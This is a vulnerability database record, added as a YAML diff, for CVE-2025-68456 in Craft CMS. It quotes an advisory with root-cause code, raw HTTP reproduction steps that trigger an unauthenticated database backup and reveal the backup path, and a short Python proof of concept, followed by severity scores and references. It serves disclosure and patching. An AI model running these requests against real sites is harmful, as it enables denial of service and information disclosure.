@@ -1,0 +1,145 @@
+vulnerability_id: VCID-3bnw-tsqn-83em
+aliases:
+  - CVE-2025-68456
+  - GHSA-v64r-7wg9-23pr
+summary: "Unauthenticated Craft CMS users can trigger a database backup\nUnauthenticated users\
+  \ can trigger database backup operations via specific admin actions, potentially leading to\
+  \ resource exhaustion or information disclosure.\n\nUsers should update to the patched versions\
+  \ (5.8.21 and 4.16.17) to mitigate the issue.\n\nCraft 3 users should update to the latest\
+  \ Craft 4 and 5 releases, which include the fixes.\n\nResources:\n\nhttps://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39\n\
+  \nhttps://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04\n\n## Affected Endpoints\n\
+  \n- `POST /admin/actions/app/migrate` (unauthenticated)\n- `POST /admin/actions/updater/backup`\
+  \ \n\n## Vulnerability Details\n\n### Root Cause\nCertain admin actions are explicitly configured\
+  \ with anonymous access:\n\n```php\n// AppController.php\nprotected array|bool|int $allowAnonymous\
+  \ = [\n    'migrate' => self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE,\n    //\
+  \ ...\n];\n\n// BaseUpdaterController.php  \nprotected array|bool|int $allowAnonymous = self::ALLOW_ANONYMOUS_LIVE\
+  \ | self::ALLOW_ANONYMOUS_OFFLINE;\n```\n\n### Attack Vector\n1. Send unauthenticated POST\
+  \ request to `/admin/actions/app/migrate`\n2. If `backupOnUpdate` is enabled, triggers `Craft::$app->getDb()->backup()`\n\
+  3. Database backup executes with configured `backupCommand`\n\n\n## Reproduction Steps\n\n\
+  ### Prerequisites\n- CraftCMS 5.8.19 installation\n- Database backups enabled (`backupOnUpdate\
+  \ => true` in config)\n- Target accessible via HTTP\n\n### Step-by-Step Reproduction\n\n1.\
+  \ I sent a `GET` request to:\n\nhttps://host/admin/login\n\n3. I copied the `CRAFT_CSRF_TOKEN`\
+  \ from the `Set-Cookie` header as well as the `csrfTokenValue` included in the response body.\n\
+  \n4. I used those values in the following request to trigger the updater initialization:\n\
+  \n```http\n   POST /admin/actions/updater/index HTTP/1.1\n   Host: host\n   Cookie: CRAFT_CSRF_TOKEN=xxxxxx\n\
+  \   Content-Type: application/x-www-form-urlencoded\n\n   CRAFT_CSRF_TOKEN=xxxxxxxxx\n```\n\
+  \n5. After this, I examined the response and found the dynamically generated sign key embedded\
+  \ inside:\n\n```json\n   Craft.Updater(\"updater\").setState({\n       \"status\": \"Nothing\
+  \ to update.\",\n       \"finished\": true,\n       \"returnUrl\": \"dashboard\",\n      \
+  \ \"data\": \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx{\\\"migrate\\\":[]}\"\n\
+  \   })\n```\n\n7. I then used that extracted `data` value to perform a database backup by\
+  \ issuing:\n\n```\n   POST /admin/actions/updater/backup HTTP/1.1\n   Host: host\n   Cookie:\
+  \ CRAFT_CSRF_TOKEN=xxxx\n   Content-Type: application/x-www-form-urlencoded\n\n   CRAFT_CSRF_TOKEN=xxxxxx&data=xxxxxxxxxxxxxxxxxxxxxxxxxx%7B%22migrate%22%3A%5B%5D%7D\n\
+  ```\n\n9. The server responded successfully, initiating a database backup and returning the\
+  \ backup path:\n\n```\n   {\n       \"nextAction\": \"migrate\",\n       \"status\": \"Updating\
+  \ database…\",\n       \"data\": \"582c1863...{\\\"migrate\\\":[],\\\"dbBackupPath\\\":\\\"\
+  /home/xxxxx/host/craft-cms/storage/backups/sendbird--2025-11-14-142917--v4.15.0.2.sql\\\"\
+  }\"\n   }\n```\n\n### Expected Results\n- **Success**: Database backup initiated (check server\
+  \ logs for backup activity)\n- **Resource Impact**: High CPU/disk usage during backup\n- **Potential\
+  \ RCE**: If `backupCommand` is configured with shell commands\n\n## Proof of Concept Code\n\
+  \n```python\nimport requests\nimport re\n\nTARGET = \"http://192.168.100.46:8080\"\nsession\
+  \ = requests.Session()\n\n# Get CSRF token\nr = session.get(f\"{TARGET}/admin/login\")\ncsrf\
+  \ = re.search(r'name=\"CRAFT_CSRF_TOKEN\" value=\"([^\"]+)\"', r.text).group(1)\n\n# Trigger\
+  \ backup\nr = session.post(f\"{TARGET}/admin/actions/app/migrate\", \n                data={\"\
+  applyProjectConfigChanges\": \"false\"})\nprint(f\"Backup triggered: {r.content}\")\n```"
+severities:
+  - score: '0.00059'
+    scoring_system: epss
+    scoring_elements: '0.18927'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68456
+  - score: '0.00078'
+    scoring_system: epss
+    scoring_elements: '0.23676'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-68456
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-v64r-7wg9-23pr
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms
+  - score: 7
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2026-01-06T14:26:08Z/
+    published_at: None
+    url: https://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04
+  - score: 7
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2026-01-06T14:26:08Z/
+    published_at: None
+    url: https://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-v64r-7wg9-23pr
+  - score: 7
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-v64r-7wg9-23pr
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-v64r-7wg9-23pr
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2026-01-06T14:26:08Z/
+    published_at: None
+    url: https://github.com/craftcms/cms/security/advisories/GHSA-v64r-7wg9-23pr
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-68456
+weaknesses:
+  - CWE-202
+  - CWE-770
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-68456
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/security/advisories/GHSA-v64r-7wg9-23pr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68456
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-v64r-7wg9-23pr
+    reference_type:
+    reference_id: GHSA-v64r-7wg9-23pr
